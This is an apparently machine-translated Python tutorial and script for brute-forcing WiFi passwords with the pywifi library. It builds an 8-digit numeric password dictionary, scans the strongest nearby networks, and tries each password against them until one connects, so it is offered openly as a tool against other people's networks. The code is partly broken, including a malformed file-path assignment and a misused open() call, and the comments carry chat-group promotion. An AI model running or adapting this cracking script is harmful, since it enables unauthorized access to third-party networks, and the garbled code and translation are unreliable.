"""
Introduction Description

The machine operating environment: system environment Win10, the operating environment Python3.6, run the tool Pycharm

Python packages need to have: pywifi

This is a brute wifi mode, the time required is longer, this paper provides a break ideas

Second, the idea of introduction

Mr. into a password dictionary (This step can also be downloaded from the Internet dictionary)

Cycle with each password password dictionary to try to connect Wifi, until success

Third, source design

1. password dictionary TXT file is generated, provided herein is relatively simple, practical crack passwords can be set according to the general, to generate relatively large relatively wide password dictionary

The following provides a simple 8 purely digital dictionary generation program codes
"""




import itertools as its

# Problems encountered do not understand? Python learning exchange group: 821 460 695 meet your needs, data base files have been uploaded, you can download their own!

if __name__ == '__main__':
    words_num = "1234567890"
    words_letter = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    r = its.product(words_num, repeat=8)
    dic = open ( "password-8 digits .txt", "w")
    for i in r:
        dic.write("".join(i))
        dic.write("".join("\n"))
    dic.close()
    
    
    
    
    
    
  #  2. brute force password when using longer
  
  
import pywifi
 
from pywifi import const # quote some definitions
 
import time
'''
 Problems encountered do not understand? Python learning exchange group: 821 460 695 meet your needs, data base files have been uploaded, you can download their own!
'''
 
def getwifi(wifilist, wificount):
    wifi = pywifi.PyWiFi () # crawled network interface cards
    ifaces = wifi.interfaces () [0] # Get the card
    ifaces.scan()
    time.sleep(8)
    bessis = ifaces.scan_results()
    allwifilist = []
    namelist = []
    ssidlist = []
    for data in bessis:
        if data.ssid not in namelist: # remove duplicate names WIFI
            namelist.append(data.ssid)
            allwifilist.append((data.ssid, data.signal))
    sorted(allwifilist, key=lambda st: st[1], reverse=True)
    time.sleep(1)
    n = 0
    if len(allwifilist) != 0:
        for item in allwifilist:
            if (item[0] not in ssidlist) & (item[0] not in wifilist):
                n = n + 1
                if n <= wificount:
                    ssidlist.append(item[0])
    print(allwifilist)
    return ssidlist
 
 
def getifaces():
    wifi = pywifi.PyWiFi () # crawled network interface cards
    ifaces = wifi.interfaces () [0] # Get the card
    ifaces.disconnect () # disconnect unlimited card connection
    return ifaces
 
 
def testwifi(ifaces, ssidname, password):
    profile = pywifi.Profile () # create a wifi connection file
    profile.ssid = ssidname # define wifissid
    profile.auth = open(const.AUTH_ALG_OPEN) # NIC
    profile.akm.append (const.AKM_TYPE_WPA2PSK) # wifi encryption algorithm
    #encrypting unit 
    profile.cipher = const.CIPHER_TYPE_CCMP #
    profile.key = password # wifi password
    ifaces.remove_all_network_profiles () # delete all other configuration files
    tmp_profile = ifaces.add_network_profile (profile) # load the configuration file
    ifaces.connect (tmp_profile) # wifi connection
    #You can connect to the inner (5) # 5 seconds time.sleep
    if ifaces.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False
 
 
def beginwork(wifinamelist):
    ifaces = getifaces()
    path = r # password-8 digits .txt
    # Path = r "password- commonly used passwords .txt"
    files = open(path, 'r')
    while True:
        try:
            password = files.readline()
            password = password.strip('\n')
            if not password:
                break
            for wifiname in wifinamelist:
                print ( "are trying to:" + wifiname + "," + password)
                if testwifi(ifaces, wifiname, password):
                    print ( "Wifi account:" + wifiname + ", Wifi password:" + password)
                    wifinamelist.remove(wifiname)
                    break
                if not wifinamelist:
                    break
        except:
            continue
    files.close()
 
 
if __name__ == '__main__':
    wifinames_e = [ "", "Vrapile"] # exclude wifi name does not crack
    wifinames = getwifi(wifinames_e, 5)
    print(wifinames)
    beginwork(wifinames)
    
    
    
    
    
    
